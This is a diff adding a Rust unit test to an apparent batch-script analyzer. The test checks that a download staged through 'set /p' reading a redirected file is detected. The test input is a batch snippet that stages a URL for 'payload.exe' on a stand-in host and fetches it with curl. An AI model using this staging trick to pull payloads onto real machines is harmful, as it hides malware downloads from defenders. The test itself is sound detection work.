@@ -496,8 +496,10 @@ mod interp_tests {
 
 #[cfg(test)]
 mod set_tests {
+    use crate::analyze;
     use crate::env::{Config, Environment};
     use crate::interp::interpret_line;
+    use crate::traits::Trait;
 
     #[test]
     fn set_basic() {
@@ -533,6 +535,29 @@ mod set_tests {
         let mut env = Environment::new(&Config::default());
         interpret_line(r#"set "EXP= 43""#, &mut env);
         assert_eq!(env.get("exp").as_deref(), Some(" 43"));
+    }
+
+    #[test]
+    fn set_p_reads_first_line_from_redirected_file() {
+        let report = analyze(
+            br#"echo https://set-p-read.example/payload.exe>url.txt
+set /p U=<url.txt
+curl -o payload.exe %U%"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://set-p-read.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "set /p did not read redirected staged content: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
     }
 }
 
